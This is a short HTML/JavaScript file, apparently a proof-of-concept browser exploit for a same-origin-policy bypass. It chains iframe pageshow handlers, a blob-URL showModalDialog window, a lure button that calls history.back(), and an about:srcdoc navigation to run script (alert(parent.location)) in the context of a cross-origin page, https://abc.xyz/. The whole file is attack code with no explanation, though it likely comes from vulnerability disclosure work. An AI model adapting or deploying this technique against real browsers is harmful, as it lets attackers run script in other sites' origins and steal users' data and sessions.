<html>

<body>
  <script>
    function createURL(data, type = 'text/html') {
      return URL.createObjectURL(new Blob([data], {
        type: type
      }));
    }

    function navigate(w, url) {
      let a = w.document.createElement('a');
      a.href = url;
      a.click();
    }

    function main() {
      let i0 = document.body.appendChild(document.createElement('iframe'));
      let i1 = document.body.appendChild(document.createElement('iframe'));

      i0.contentWindow.onpageshow = () => {
        navigate(window, 'https://abc.xyz/');

        showModalDialog(createURL(`
<script>
let it = setInterval(() => {
    try {
        opener.document.x;
    } catch (e) {
        clearInterval(it);
        window.close();
    }
}, 10);
</scrip` + 't>'));

      };

      i1.contentWindow.onpageshow = () => {
        i1.srcdoc = '<script>alert(parent.location);</scrip' + 't>';
        navigate(i1.contentWindow, 'about:srcdoc');
      };

      navigate(window, createURL(`<html><head></head><body><button>Click anywhere</button><script>
window.onclick = () => {
    window.onclick = null;

    history.back();
};

</scrip` + `t></body></html>`));
    }

    window.onload = () => {
      setTimeout(main, 0);
    };
  </script>
</body>

</html>